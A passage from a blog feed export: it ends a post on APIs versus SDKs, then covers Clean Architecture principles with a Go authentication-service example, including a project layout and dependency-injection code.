+<pre class="EnlighterJSRAW" data-enlighter-language="json">{
+    "type": "iris",
+    "plant_name": "Iris Setosa"
+}</pre>
+<p class="maps-to-line">So, we understand the building blocks of what an API is, but the question arises, As a developer, how do we call an API from our code? In our case, As a mobile app developer, we don&#8217;t want to set up the request with all the above building blocks of operations, parameters, and endpoints and deal with raw JSON objects, right?</p>
+<blockquote class="maps-to-line">
+<h2 id="thats-where-sdks-come-in-and-shine">That&#8217;s where SDKs come in and shine.</h2>
+</blockquote>
+<h2 id="what-is-sdk" class="maps-to-line">What is SDK?</h2>
+<div class="joplin-editable">
+<blockquote>
+<pre class="hljs">SDK - Software Development Kit</pre>
+</blockquote>
+</div>
+<p class="maps-to-line">So, we can easily think of SDK as a toolbox of tools or code that calls the APIs for us. Awesome, right? So, we may be specialized in one programming language over the other. Hmm&#8230; there are SDKs in a variety of languages. So there&#8217;s maybe an SDK in Java, Python, Golang, etc. Whichever language is our specialty there&#8217;s probably an SDK for us to use which is exposed by the recognition service developers or some open source community.</p>
+<p class="maps-to-line">Back to our example, What might an SDK look like in that example?<br />In the Mobile app, we&#8217;ll use the SDK tool which is provided by recognition service developers or some open source community. Since it&#8217;s a mobile app we&#8217;ll use the Flutter SDK. In the flutter SDK, rather than having to configure our request manually with all these building blocks of an API as we explains above, you might call just a method, that may be called, <code class="inline-code">analizePlantImage</code> and that will call those various API building blocks like the Operations, Parameters, Endpoints and request the API from our code. In response, we&#8217;ll get a response but it won&#8217;t be necessarily a JSON object, but it might be some code or some model.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="dart">import 'package:reconize/plant.dart';
+
+Plant plant = await plant.analizePlantImage("plant.jpg");
+
+print(plant.toJson());</pre>
+<p class="maps-to-line">In the <code class="inline-code">analizePlantImage</code> method we need to pass the pant file name binary file <code class="inline-code">plant.jpg</code>, the SDK will set the required parameters for the API call and send the request to the recognition service and in response, we can go ahead and set a label in our mobile app from that response object via the SDK and we&#8217;re able to see plant name after analyzed.</p>
+<p class="maps-to-line">So, hopefully, This kind of summarizes what an API and an SDK are. What&#8217;re they used for and how they truly fundamental tools in our serverless cloud app development?</p>
+<div class="joplin-editable">
+<pre class="hljs"><code></code></pre>
+</div></div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/api-vs-sdk-whatre-the-differences/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Dive to Clean Architecture</title>
+		<link>/blog/dive-to-clean-architecture/</link>
+					<comments>/blog/dive-to-clean-architecture/#respond</comments>
+		
+		<dc:creator><![CDATA[shuvojit.saha]]></dc:creator>
+		<pubDate>Wed, 10 Aug 2022 07:12:54 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<guid isPermaLink="false">/?p=9961</guid>
+
+					<description><![CDATA[In this article, I’ll try to share my knowledge and concept of Clean Architecture and how to apply it properly in systems. What is Good Design? Software is well designed if the measure of effort required to fulfill the demands of the customers is low and stays low throughout the lifetime of the system. The [&#8230;]]]></description>
+										<content:encoded><![CDATA[<p class="code-line" dir="auto" data-line="2">In this article, I’ll try to share my knowledge and concept of Clean Architecture and how to apply it properly in systems.</p>
+<h3 id="table-of-contents" class="code-line" dir="auto" data-line="4">What is Good Design?</h3>
+<p class="code-line" dir="auto" data-line="26">Software is well designed if the measure of effort required to fulfill the demands of the customers is low and stays low throughout the lifetime of the system. The effort refers to the human resources who are dedicated to up and running the required system. If the efforts grow with each release, the design is bad.</p>
+<div style="width: 710px" class="wp-caption alignnone"><img decoding="async" id="image-hash-867940001" class="loading" src="https://miro.medium.com/max/700/1*BQ7VHKeKbq5toq4uwRc8YA.png" alt="Figure-1: Productivity by - release " width="700" height="449" data-src="https://miro.medium.com/max/700/1*BQ7VHKeKbq5toq4uwRc8YA.png" /><p class="wp-caption-text">Productivity by &#8211; release</p></div>
+<p class="code-line" dir="auto" data-line="32">The figure depicts the signature of a mess in a system to the developers. Productivity of the developers was at pick during the first release but their productivity degraded with each release. Most modern developers have a misconception: “We can clean it up later; we just have to get to market fast!”. Writing messy codes makes them go fast in short term but just slows them in the long run. According to Uncle Bob, the simple truth of software development:</p>
+<p class="code-line" dir="auto" data-line="34"><em><strong>The only way to go fast, is to go well.</strong></em></p>
+<h3 id="what-is-architecture" class="code-line" dir="auto" data-line="36">What is Architecture?</h3>
+<p class="code-line" dir="auto" data-line="38"><em><strong>“The architecture of a software system is the shape given to that system by those who build it. The form of that shape is in the division of that system into components, the arrangement of those components, and the ways in which those components communicate with each other.” &#8211; </strong>e</em>xcerpt from <strong>Clean Architecture: A Craftsman&#8217;s Guide to Software Structure and Design (Robert C. Martin Series)</strong></p>
+<p class="code-line" dir="auto" data-line="41">Every software system incorporates two types of value: behavior and structure. The second of them is the greatest of the two because it is the value that makes software <em>soft</em>. The software was invented to easily change the behavior of machines. But that flexibility depends critically on the shape of the system, the arrangement of its components, and the way those components are interconnected. The primary purpose of a well-shaped architecture is to support the life cycle of the system. Good architecture makes the system easy to understand, easy to develop, easy to deploy, and easy to maintain. Moreover, it is to leave as many options as possible, for as long as possible. The main objective is to minimize the lifetime cost of the system and maximize programmer productivity.</p>
+<p class="code-line" dir="auto" data-line="43">Good architecture must support</p>
+<ul class="code-line" dir="auto" data-line="45">
+<li class="code-line" dir="auto" data-line="45"><strong>Use Cases</strong> &#8211; t<em>he intent of the system is the first priority of the architecture. The most important thing a good architecture can do to support behavior is to clarify and expose that behavior so that the intent of the system is visible at the architectural level.</em></li>
+<li class="code-line" dir="auto" data-line="46"><strong>Operation</strong> &#8211; <em>a good architecture of a system makes the operation including use cases, features, and the required behaviors of the system readily apparent to the developers. Architecture should reveal operation which simplifies the understanding of the system, and therefore, greatly aids in development and maintenance.</em></li>
+<li class="code-line" dir="auto" data-line="47"><strong>Maintenance</strong> &#8211; <em>The primary cost of maintenance is in spelunking and risk. Spelunking is the cost of digging through the existing software, trying to determine the best place and the best strategy to add a new feature or to repair a defect. While making such changes, the likelihood of creating inadvertent defects is always there, adding to the cost of risk. A carefully thought-through architecture vastly mitigates these costs by separating the system into components, and isolating those components through stable interfaces, it is possible to illuminate the pathways for future features and greatly reduce the risk of accidental breakage.</em></li>
+<li class="code-line" dir="auto" data-line="48"><strong>Development</strong> &#8211; <em>A system that must be developed by an organization with many teams and many concerns must have an architecture that facilitates independent actions by those teams so that the teams do not interfere with each other during development. This is accomplished by properly partitioning the system into well-isolated, independently developable components. Those components can then be allocated to teams that can work independently of each other.</em></li>
+<li class="code-line" dir="auto" data-line="49"><strong>Deployment</strong> &#8211; <em>A good architecture helps the system to be immediately deployable after build. A goal of a software architecture should be to make a system that can be easily deployed with a single action. This is achieved through the proper partitioning and isolation of the components of the system, including those master components that tie the whole system together and ensure that each component is properly started, integrated, and supervised.</em></li>
+<li class="code-line" dir="auto" data-line="50"><strong>Leaving Options Open</strong> &#8211; <em>A good architecture makes the system easy to change, in all the ways that it must change, by leaving options open. Balancing all of these concerns with a component structure that mutually satisfies them all is pretty hard in reality. However, some principles are relatively inexpensive to implement and can help to balance them by partitioning the systems into well-isolated components that allow us to leave as many options open as possible, for as long as possible.</em></li>
+</ul>
+<h3 id="what-is-clean-architecture" class="code-line" dir="auto" data-line="52">What is Clean Architecture?</h3>
+<p class="code-line" dir="auto" data-line="54">In 2012 Robert C. Martin proposed the architectural pattern in his famous book &#8211; <a title="https://www.oreilly.com/library/view/clean-architecture-a/9780134494272/" href="https://www.oreilly.com/library/view/clean-architecture-a/9780134494272/" data-href="https://www.oreilly.com/library/view/clean-architecture-a/9780134494272/" data- rel="nofollow noopener" target="_blank"><em><strong>“Clean Architecture: A Craftsman&#8217;s Guide to Software Structure and Design”</strong></em></a> by thinking about isolated, maintainable, testable, scalable, evolutive, and well-written code. Though there are a whole range of architectures e.g. <a title="https://alistair.cockburn.us/hexagonal-architecture/" href="https://alistair.cockburn.us/hexagonal-architecture/" data-href="https://alistair.cockburn.us/hexagonal-architecture/" data- rel="nofollow noopener" target="_blank">Hexagonal Architecture</a>, <a title="https://jeffreypalermo.com/2008/07/the-onion-architecture-part-1/" href="https://jeffreypalermo.com/2008/07/the-onion-architecture-part-1/" data-href="https://jeffreypalermo.com/2008/07/the-onion-architecture-part-1/" data- rel="nofollow noopener" target="_blank">Onion Architecture</a>, <a title="https://www.artima.com/articles/the-dci-architecture-a-new-vision-of-object-oriented-programming" href="https://www.artima.com/articles/the-dci-architecture-a-new-vision-of-object-oriented-programming" data-href="https://www.artima.com/articles/the-dci-architecture-a-new-vision-of-object-oriented-programming" data- rel="nofollow noopener" target="_blank">DCI</a>, <a title="https://vaclavkosar.com/software/Boundary-Control-Entity-Architecture-The-Pattern-to-Structure-Your-Classes" href="https://vaclavkosar.com/software/Boundary-Control-Entity-Architecture-The-Pattern-to-Structure-Your-Classes" data-href="https://vaclavkosar.com/software/Boundary-Control-Entity-Architecture-The-Pattern-to-Structure-Your-Classes" data- rel="nofollow noopener" target="_blank">BCE</a>, etc. having variations in their details, they have a similar objective which is the <a title="https://en.wikipedia.org/wiki/Separation_of_concerns" href="https://en.wikipedia.org/wiki/Separation_of_concerns" data-href="https://en.wikipedia.org/wiki/Separation_of_concerns" data- rel="nofollow noopener" target="_blank">Separation of concerns</a>. They all achieve this separation by dividing the software into layers. Each has at least one layer of business rules and another layer for user and system interfaces. Uncle Bob presented his architecture together with this diagram:</p>
+<div style="width: 782px" class="wp-caption alignnone"><img decoding="async" id="image-hash--967721664" class="loading" src="https://blog.cleancoder.com/uncle-bob/images/2012-08-13-the-clean-architecture/CleanArchitecture.jpg" alt="Figure-2: Clean Architecture - promoted by Robert C. Martin (Uncle Bob)" width="772" height="567" data-src="https://blog.cleancoder.com/uncle-bob/images/2012-08-13-the-clean-architecture/CleanArchitecture.jpg" /><p class="wp-caption-text">Clean Architecture &#8211; promoted by Robert C. Martin (Uncle Bob)</p></div>
+<p class="code-line" dir="auto" data-line="60">The key points of this architecture are &#8211;</p>
+<ul class="code-line" dir="auto" data-line="62">
+<li class="code-line" dir="auto" data-line="62">It is really about the <strong>s<em>eparation of Concerns.</em></strong></li>
+<li class="code-line" dir="auto" data-line="63">Should be <strong>i<em>ndependent of frameworks</em>.</strong> This allows you to use frameworks as tools rather than forcing you to cram your system into their limited constraints.</li>
+<li class="code-line" dir="auto" data-line="64">Every layer should be <strong>testable.</strong> The business rules can be tested without the UI, database, web server, or any other external element.</li>
+<li class="code-line" dir="auto" data-line="65">Should be <strong>independent of UI.</strong> The UI can change easily, without changing the rest of the system. A web UI could be replaced with a console UI, for example, without changing the business rules.</li>
+<li class="code-line" dir="auto" data-line="66">Should be <strong>independent of the database</strong>. You can swap out Oracle or SQL Server for Mongo, BigTable, CouchDB, or something else. Your business rules are not bound to the database.</li>
+<li class="code-line" dir="auto" data-line="67">Should be <strong>independent of any external agency</strong>. The innermost circle is the highest level. Inner circles are policies and other circles are mechanisms. <strong>Inner circles cannot depend on outer circles. Also, outer circles cannot influence inner circles.</strong></li>
+</ul>
+<h4 id="principles-of-clean-architecture" class="code-line" dir="auto" data-line="69">Principles of clean architecture</h4>
+<p class="code-line" dir="auto" data-line="71">Some of the following principles are shared with <em><strong><a title="https://blog.cleancoder.com/uncle-bob/2020/10/18/Solid-Relevance.html" href="https://blog.cleancoder.com/uncle-bob/2020/10/18/Solid-Relevance.html" data-href="https://blog.cleancoder.com/uncle-bob/2020/10/18/Solid-Relevance.html" data- rel="nofollow noopener" target="_blank">SOLID</a></strong></em> principles defined by Uncle Bob and other popular strategies. The following definitions are just summaries, so I suggest you go through the book for a better understanding.</p>
+<p class="code-line" dir="auto" data-line="73">Let’s explore each</p>
+<ul class="code-line" dir="auto" data-line="75">
+<li class="code-line" dir="auto" data-line="75"><strong>Common Closure Principle</strong> &#8211; It prompts to gather into components those classes that are likely to change for the same reasons. If two classes are so tightly bound, either physically or conceptually, that they always change together, then they belong in the same component. This minimizes the workload related to releasing, revalidating, and redeploying the software. This is the Single Responsibility Principle(SRP) restated for components.</li>
+<li class="code-line" dir="auto" data-line="76"><strong>Common Reuse Principle</strong> &#8211; It helps us to decide which classes and modules should be placed into a component. It states that classes and modules that tend to be reused together belong in the same component. When one component uses another, it creates a dependency between each other. Perhaps the using component uses only one class within the used component, they still don’t weaken the dependency though. The using dependency still depends on the used component. It is also related to the <strong>Interface Segregation Principle</strong>.</li>
+<li class="code-line" dir="auto" data-line="77"><strong>Dependency Inversion Principle</strong> &#8211; The rule states that outer layers (implementation details) can refer to inner layers (abstractions), but not the other way around. The inner layers should instead depend on interfaces. This provides a clear separation between ports, adapters, and application logic. Clean Architecture emphasizes this principle.</li>
+</ul>
+<h4 id="the-dependency-rule" class="code-line" dir="auto" data-line="79">The Dependency Rule</h4>
+<p class="code-line" dir="auto" data-line="81">The concentric circles represent different areas of software. In general, the further in you go, the higher level the software becomes. The outer circles are mechanisms. The inner circles are policies.</p>
+<p class="code-line" dir="auto" data-line="83">The overriding rule that makes this architecture work is the <em><strong>Dependency Rule:</strong></em></p>
+<p class="code-line" dir="auto" data-line="85"><em><strong>“Source code dependencies must point only inward, toward higher-level policies.”</strong></em></p>
+<div style="width: 1410px" class="wp-caption aligncenter"><img decoding="async" id="image-hash-1044373688" class="loading" src="https://miro.medium.com/max/1400/0*00xx3fNwcNgsI1eV.png" alt="https://miro.medium.com/max/1400/0*00xx3fNwcNgsI1eV.png" width="1400" height="465" data-src="https://miro.medium.com/max/1400/0*00xx3fNwcNgsI1eV.png" /><p class="wp-caption-text">Dependency Rule</p></div>
+<p class="code-line" dir="auto" data-line="89"><strong>What does it mean?</strong></p>
+<p class="code-line" dir="auto" data-line="91">Nothing in an inner circle can know anything at all about something in an outer circle. In particular, the name of something declared in an outer circle must not be mentioned by the code in an inner circle. That includes functions, classes, variables, or any other named software entity. i.e. <strong>Elements located in the Entities circle</strong> (the enterprise business rules) <strong>should not refer to any elements outside of it</strong> (such as application business rules, interface adapters, frameworks, and drivers).</p>
+<p class="code-line" dir="auto" data-line="93">As well as data formats used in an outer circle should not be used by an inner circle, especially if those formats are generated by a framework in an outer circle. The Clean architecture doesn’t want anything in an outer circle to impact the inner circles.</p>
+<p class="code-line" dir="auto" data-line="95"><img decoding="async" class="aligncenter wp-image-9958 size-full" src="/wp-content/uploads/2022/08/images.png" alt="images Dive to Clean Architecture" width="497" height="101" srcset="/wp-content/uploads/2022/08/images.png 497w, /wp-content/uploads/2022/08/images-480x98.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 497px, 100vw"></p>
+<p class="code-line" dir="auto" data-line="97">Let&#8217;s discuss each of these layers</p>
+<h4 id="entities" class="code-line" dir="auto" data-line="99">Entities</h4>
+<ul class="code-line" dir="auto" data-line="101">
+<li class="code-line" dir="auto" data-line="101">Encapsulate enterprise-wide critical business rules
+<ul class="code-line" dir="auto" data-line="102">
+<li class="code-line" dir="auto" data-line="102">can be
+<ul class="code-line" dir="auto" data-line="103">
+<li class="code-line" dir="auto" data-line="103">an object with methods</li>
+<li class="code-line" dir="auto" data-line="104">a set of data structures and functions</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="code-line" dir="auto" data-line="105">Could be used in many different applications in the enterprise</li>
+<li class="code-line" dir="auto" data-line="106">Are the most general and high-level rules and the least likely to change when the external layer changes</li>
+</ul>
+<h4 id="use-cases" class="code-line" dir="auto" data-line="108">Use Cases</h4>
+<ul class="code-line" dir="auto" data-line="110">
+<li class="code-line" dir="auto" data-line="110">Encapsulate and implements application-specific business rules</li>
+<li class="code-line" dir="auto" data-line="111">Orchestrate the flow of data to and from the entities and direct entities to use the critical business rules to achieve the goals of the use case</li>
+<li class="code-line" dir="auto" data-line="112">Could not expect changes to affect the entities</li>
+<li class="code-line" dir="auto" data-line="113">Could not be affected by changes in an external layer such as database, web, UI as well</li>
+<li class="code-line" dir="auto" data-line="114">Could be changed only if the operation of the application changes</li>
+</ul>
+<p class="code-line" dir="auto" data-line="116"><img decoding="async" id="image-hash-599026463" class="loading aligncenter" src="https://www.utm.mx/~caff/doc/OpenUPWeb/openup/guidances/guidelines/resources/user_login_ucm.JPG" alt="https://www.utm.mx/~caff/doc/OpenUPWeb/openup/guidances/guidelines/resources/user_login_ucm.JPG" width="472" height="142" data-src="https://www.utm.mx/~caff/doc/OpenUPWeb/openup/guidances/guidelines/resources/user_login_ucm.JPG" /></p>
+<h4 id="interface-adapters" class="code-line" dir="auto" data-line="118">Interface Adapters</h4>
+<ul class="code-line" dir="auto" data-line="120">
+<li class="code-line" dir="auto" data-line="120">Set of adapters
+<ul class="code-line" dir="auto" data-line="121">
+<li class="code-line" dir="auto" data-line="121">Convert data from the format most convenient for the use cases and entities</li>
+<li class="code-line" dir="auto" data-line="122">To the format most convenient for an external agency such as the database or the web</li>
+</ul>
+</li>
+<li class="code-line" dir="auto" data-line="123">Wholly contain the MVC architecture &#8211; the presenter, views, and controllers</li>
+</ul>
+<h4 id="frameworks-and-drivers" class="code-line" dir="auto" data-line="125">Frameworks and Drivers</h4>
+<ul class="code-line" dir="auto" data-line="127">
+<li class="code-line" dir="auto" data-line="127">Framework and tools such as
+<ul class="code-line" dir="auto" data-line="128">
+<li class="code-line" dir="auto" data-line="128">Database</li>
+<li class="code-line" dir="auto" data-line="129">Web framework</li>
+</ul>
+</li>
+<li class="code-line" dir="auto" data-line="130">Glue code that communicates to the next circle inward</li>
+<li class="code-line" dir="auto" data-line="131">This layer contains all the details
+<ul class="code-line" dir="auto" data-line="132">
+<li class="code-line" dir="auto" data-line="132">Keep these things on the outside where they do little harm</li>
+</ul>
+</li>
+</ul>
+<h4 id="only-four-layers" class="code-line" dir="auto" data-line="134">Only four layers?</h4>
+<p class="code-line" dir="auto" data-line="136">There is no limit to keeping the architecture only to four layers. There are some cases you need more than just these four layers. However, the dependency rule always applies. <em>Note the flow of control: It begins in the controller, moves through the use case, and then winds up executing in the presenter. Note also the source code dependencies: Each points inward toward the use cases</em>. As you move inward, the level of abstraction and policy increases. The outermost circle consists of low-level concrete details. As you move inward, the software grows more abstract and encapsulates higher-level policies. The innermost circle is the most general and highest level.</p>
+<h3 id="clean-architecture-with-golang" class="code-line" dir="auto" data-line="138">Clean Architecture With Golang</h3>
+<p class="code-line" dir="auto" data-line="140">Golang lends itself nicely to clean architecture. The interface/implementation pattern of Golang makes the dependency injection super easy. By defining small and clear interfaces and then implementing them in separate packages, the implementation details will end up nicely decoupled from core logic. It is quite simple to test each layer with popular library <a title="https://github.com/stretchr/testify" href="https://github.com/stretchr/testify" data-href="https://github.com/stretchr/testify" data- rel="nofollow noopener" target="_blank"><strong>testify</strong></a> and <a title="https://github.com/vektra/mockery" href="https://github.com/vektra/mockery" data-href="https://github.com/vektra/mockery" data- rel="nofollow noopener" target="_blank"><strong>mockery</strong></a> as well.</p>
+<p class="code-line" dir="auto" data-line="142">Let&#8217;s discuss clean architecture implementation in Golang with a simple authentication management service named <em><strong><a title="https://github.com/ParthoShuvo/auth-system" href="https://github.com/ParthoShuvo/auth-system" data-href="https://github.com/ParthoShuvo/auth-system" data- rel="nofollow noopener" target="_blank">AuthService</a></strong></em>. Hopefully, starting with this service will help you start as you mean to go on!</p>
+<h4 id="quick-start" class="code-line" dir="auto" data-line="144">Quick Start</h4>
+<p class="code-line" dir="auto" data-line="146">Once checking out the template, use the provided Makefile which includes a couple of targets for building, running, and tearing down the service.</p>
+<ul class="code-line" dir="auto" data-line="148">
+<li class="code-line" dir="auto" data-line="148"><em>Run with Docker (starts MySQL, Redis, Mailhog)</em>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">make compose-up</pre>
+</li>
+</ul>
+<ul>
+<li dir="auto" data-line="160"><em><em>Tear-down the service</em></em>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">make compose-down</pre>
+</li>
+</ul>
+<h4 id="project-structure" class="code-line" dir="auto" data-line="160">Project Structure</h4>
+<p class="code-line" dir="auto" data-line="162">Full details are included in the project&#8217;s <em><a title="https://github.com/ParthoShuvo/auth-system/tree/master/authsvc" href="https://github.com/ParthoShuvo/auth-system/tree/master/authsvc" data-href="https://github.com/ParthoShuvo/auth-system/tree/master/authsvc" data- rel="nofollow noopener" target="_blank"><strong>README</strong></a></em>, but some areas of particular interest include:</p>
+<blockquote class="code-line" dir="auto" data-line="164">
+<p class="code-line" dir="auto" data-line="164"><em><strong>authsvc/authsvc.go</strong></em></p>
+</blockquote>
+<p class="code-line" dir="auto" data-line="167">The entry point of the service performs object initialization and dependency injection starts the server and waits until it’s time to gracefully terminate.</p>
+<blockquote class="code-line" dir="auto" data-line="169">
+<p class="code-line" dir="auto" data-line="169"><em><strong>authsvc/cfg/config.go</strong></em></p>
+</blockquote>
+<p class="code-line" dir="auto" data-line="172">Configuration and logger initialization, before control is passed to <em><strong>main in authsvc/authsvc.go.</strong></em></p>
+<p class="code-line" dir="auto" data-line="174">Now that we have the project structure as below:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">├── cache                &lt;- cache database repository module (Redis)
+│   ├── auth.go          &lt;- refresh token store
+│   └── tokendb.go       &lt;- connection setup and managing connection instance
+├── cfg                  &lt;- project configuration module related on authsvc.json
+│   ├── config.go        
+├── db                   &lt;- database repository module (MySQL)
+│   ├── authdb.go        &lt;- authdb connection setup and managing connection instance
+│   └── permission.go    &lt;- Permission store
+│   └── role.go          &lt;- Role store
+│   └── permission.go    &lt;- User store
+├── email                &lt;- SMTP email client module
+│   ├── emailclient.go   &lt;- Use for sending new mail
+├── log4u                &lt;- logging module; much like log4j has
+│   ├── log4u.go
+├── render               &lt;- HTTP response renderer module
+│   └── jsonrenderer.go  &lt;- HTTP JSON response definition
+│   └── renderer.go      &lt;- Renderer interface
+├── resource             &lt;- REST API endpoints's (resource) request handler
+│   └── auth.go          &lt;- Request handlers for auth resource e.g. /auth
+│   └── common.go        &lt;- resource utility
+│   └── errors.go        &lt;- HTTP request ERROR responses
+│   └── home.go          &lt;- / endpoint request handler
+│   └── protect.go       &lt;- Route protector
+│   └── token.go         &lt;- Request handlers for token resource e.g. /auth/token
+└── route                &lt;- Route builder module
+│   └── routebuilder.go
+├── table                &lt;- Database entity/tables
+│   └── permission       &lt;- Permission table module consists of its definition and related DB operations
+│       └── table.go     
+│   └── role             &lt;- Role table module consists of its definition and related DB operations
+|       └── table.go
+│   └── user             &lt;- User table module consists of its definition and related DB operations
+|       └── table.go
+└── token                &lt;- token service module
+│   └── service.go
+│   └── token.go
+└── uc                   &lt;- Use cases
+│   └── adm              &lt;- Admin related use cases
+│       └── handler.go     
+│   └── permission       &lt;- Permission related use cases
+|       └── handler.go
+│   └── role             &lt;- Role related use cases
+|       └── handler.go
+│   └── token            &lt;- Token related use cases
+|       └── handler.go
+│   └── user             &lt;- User related use cases
+|       └── handler.go
+│   └── common.go        &lt;- Use case utilities
+└── validator            &lt;- validator module with custom validators's tag e.g. `validPwd`
+│   └── validator.go
+└── authsvc.go           &lt;- entry point of the service
+└── authsvc.json         &lt;- service config
+└── go.mod               &lt;- list dependent packages
+└── go.sum               &lt;- list checksum of downloaded go modules and their dependencies
+└── version.go           &lt;- project versioning</pre>
+<p class="code-line" dir="auto" data-line="174">Here, layer-to-package directory mapping</p>
+<table class="code-line" dir="auto" data-line="236">
+<thead class="code-line" dir="auto" data-line="236">
+<tr class="code-line" dir="auto" data-line="236">
+<th>Layer</th>
+<th>Package Directory</th>
+</tr>
+</thead>
+<tbody class="code-line" dir="auto" data-line="238">
+<tr class="code-line" dir="auto" data-line="238">
+<td>Entities</td>
+<td>token, table</td>
+</tr>
+<tr class="code-line" dir="auto" data-line="239">
+<td>Use Cases</td>
+<td>adm, permission, role, token, user under uc directory</td>
+</tr>
+<tr class="code-line" dir="auto" data-line="240">
+<td>Interface Adapters</td>
+<td>resource, render</td>
+</tr>
+<tr class="code-line" dir="auto" data-line="241">
+<td>Frameworks and Drivers</td>
+<td>route, repository e.g. db, cache, email</td>
+</tr>
+</tbody>
+</table>
+<div class="code-line" dir="auto" data-line="243"></div>
+<blockquote>
+<aside>???? <strong>Note</strong>: The project structure may vary depending on the project or team basis. In our team, we have a different project structure of clean architecture implementation but the separation of concern between each layer remains the same as per the philosophy. So don’t follow anything blindly, though you can take inspiration from the above structure or others. However, the rule of thumb is to create a boilerplate structure of clean architecture as per team and project requirements with a specific language and reuse the template for developing new services.</p>
+<div class="code-line" dir="auto" data-line="246"></div>
+</aside>
+</blockquote>
+<h4 id="dependency-injection" class="code-line" dir="auto" data-line="248">Dependency Injection</h4>
+<p class="code-line" dir="auto" data-line="250">With the <em><strong>Dependency Inversion Principle, </strong></em>we’ll make use of dependency injection to enable a weak coupling between components and minimize direction dependencies.</p>
+<ul class="code-line" dir="auto" data-line="252">
+<li class="code-line" dir="auto" data-line="252">The <strong>Entities</strong> hold core business logic and know nothing about other layers. <em>table</em>, <em>token</em>, etc. packages are the entities in the AuthService.</li>
+<li class="code-line" dir="auto" data-line="253">The <em><strong>UseCases</strong></em> can import entities but knows nothing about outer layers. <em>user/handler</em> in uc directory depends on entity e.g. <strong>table</strong> struct. It has no idea whether it’s being called by an HTTP request or CLI command.</li>
+<li class="code-line" dir="auto" data-line="254"><em><strong>Controllers</strong></em> (e.g. <em>resource package) can import usecase packages. They are the entry points to the application that often execute application services or commands.</em></li>
+<li class="code-line" dir="auto" data-line="255"><strong><a title="https://github.com/gorilla/mux" href="https://github.com/gorilla/mux" data-href="https://github.com/gorilla/mux" data- rel="nofollow noopener" target="_blank">gorilla-mux</a> </strong><em>route</em>, <em>db</em> (MySQL), <em>cache</em> (Redis), <em>SMTP</em> (Mailhog) will operate on types found in <em><strong>UseCases</strong></em> and <em><strong>Entities</strong></em> layers.</li>
+</ul>
+<div id="attachment_9974" style="width: 863px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-9974" decoding="async" class="wp-image-9974 size-full" src="/wp-content/uploads/2022/08/clean-architecture-1.png" alt="Clear architecture in AuthService" width="853" height="586" srcset="/wp-content/uploads/2022/08/clean-architecture-1.png 853w, /wp-content/uploads/2022/08/clean-architecture-1-480x330.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 853px, 100vw" /><p id="caption-attachment-9974" class="wp-caption-text">Clear architecture in AuthService</p></div>
+<p class="code-line" dir="auto" data-line="261">To practice DIP in Golang, it’s best to understand Golang’s idea of <a title="https://medium.com/@cep21/preemptive-interface-anti-pattern-in-go-54c18ac0668a" href="https://medium.com/@cep21/preemptive-interface-anti-pattern-in-go-54c18ac0668a" data-href="https://medium.com/@cep21/preemptive-interface-anti-pattern-in-go-54c18ac0668a" data- rel="nofollow noopener" target="_blank"><em><strong>“Accepts interfaces and return structs”</strong></em></a>.</p>
+<p class="code-line" dir="auto" data-line="263">Here is an example of DIP implementation in Golang where the <em>Permission</em> Table depends on the <em>Store</em> interface and <em>db</em> struct implements the store interface. By making it interface-dependent in this way, you can write code that is resistant to changes and easy to write tests.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">package permission
+
+type Permission struct {
+ ID          int    `json:"id"`
+ Name        string `json:"name"`
+ Description string `json:"description"`
+}
+
+type Store interface {
+ ReadUserPermissions(string) ([]*Permission, error)
+}
+
+type Table struct {
+ store Store
+}
+
+func NewTable(s Store) *Table {
+ return &amp;Table{s}
+}
+
+func (t *Table) ReadUserPermissions(login string) ([]*Permission, error) {
+ return t.store.ReadUserPermissions(login)
+}</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">package db
+
+import (
+ "database/sql"
+
+ "github.com/parthoshuvo/authsvc/table/permission"
+)
+
+// ReadUserPermissions fetches all authorized permissions for a user.
+func (ad *AuthDB) ReadUserPermissions(login string) ([]*permission.Permission, error) {
+ return ad.readPermissions(func() (*sql.Rows, error) {
+  return ad.db.Query("call sp_read_user_permission(?)", login)
+ })
+}
+
+func (ad *AuthDB) readPermissions(dbReader func() (*sql.Rows, error)) ([]*permission.Permission, error) {
+ perms := make([]*permission.Permission, 0, 10)
+ rows, err := dbReader()
+ if err == sql.ErrNoRows {
+  return perms, nil
+ }
+ if err != nil {
+  return perms, err
+ }
+ defer rows.Close()
+ for rows.Next() {
+  var perm permission.Permission
+  if err := rows.Scan(
+   &amp;perm.ID,
+   &amp;perm.Name,
+   &amp;perm.Description,
+  ); err != nil {
+   return perms, err
+  }
+  perms = append(perms, &amp;perm)
+ }
+ return perms, nil
+}</pre>
+<p class="code-line" dir="auto" data-line="332">Let’s look at the user login use case diagram to understand how the outer layers use the inner layer as a dependency. One thing to note is that the outer layer’s dependencies only point inward towards the inner layers.</p>
+<div id="attachment_9976" style="width: 1191px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-9976" decoding="async" class="wp-image-9976 size-full" src="/wp-content/uploads/2022/08/user-login-usecase.png" alt="User Login Use Case Diagram" width="1181" height="767" srcset="/wp-content/uploads/2022/08/user-login-usecase.png 1181w, /wp-content/uploads/2022/08/user-login-usecase-980x636.png 980w, /wp-content/uploads/2022/08/user-login-usecase-480x312.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1181px, 100vw" /><p id="caption-attachment-9976" class="wp-caption-text">User Login Use Case Diagram</p></div>
+<div class="code-line" dir="auto" data-line="338"></div>
+<blockquote>
+<aside>???? <strong>Note:</strong> Accepting interfaces gives your API the greatest flexibility and returning structs allows the people reading your code to quickly navigate to the correct function. Interfaces are an abstraction and abstraction is sometimes useful. However, **unnecessary abstraction creates unnecessary complications.** Don’t overcomplicate code until it’s needed.</p>
+<div class="code-line" dir="auto" data-line="341"></div>
+</aside>
